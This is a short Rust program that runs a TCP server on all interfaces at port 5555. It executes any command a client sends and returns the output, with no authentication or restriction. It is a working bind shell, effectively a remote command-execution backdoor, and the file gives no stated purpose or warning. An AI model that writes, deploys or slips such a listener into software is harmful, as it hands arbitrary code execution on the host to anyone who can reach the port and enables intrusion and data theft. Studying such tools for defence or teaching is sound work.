use std::{
    io::{Read, Write},
    net::{TcpListener, TcpStream},
    process::Command,
};

fn handle_client(mut stream: TcpStream) -> Result<(), Box<dyn std::error::Error>> {
    let mut buffer = [0u8; 4096];
    let size = stream.read(&mut buffer)?;
    let command = String::from_utf8_lossy(&buffer[..size]);

    println!("Received command: {}", command);

    let parts: Vec<&str> = command.split_whitespace().collect();
    if parts.is_empty() {
        return Ok(());
    }

    let program = parts[0];
    let args = &parts[1..];
    let output = Command::new(program).args(args).output();
    let response = match output {
        Ok(output) => {
            let mut result = String::new();
            result.push_str("=== STDOUT ===\n");
            result.push_str(&String::from_utf8_lossy(&output.stdout));
            result.push_str("\n=== STDERR ===\n");
            result.push_str(&String::from_utf8_lossy(&output.stderr));
            result
        }
        Err(e) => {
            format!("Failed to execute command: {e}")
        }
    };

    stream.write_all(response.as_bytes())?;

    Ok(())
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let listener = TcpListener::bind("0.0.0.0:5555")?;
    println!("Server listening on port 5555");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("Client connected");
                handle_client(stream)?;
            }
            Err(e) => {
                eprintln!("Connection error: {e}");
            }
        }
    }

    Ok(())
}
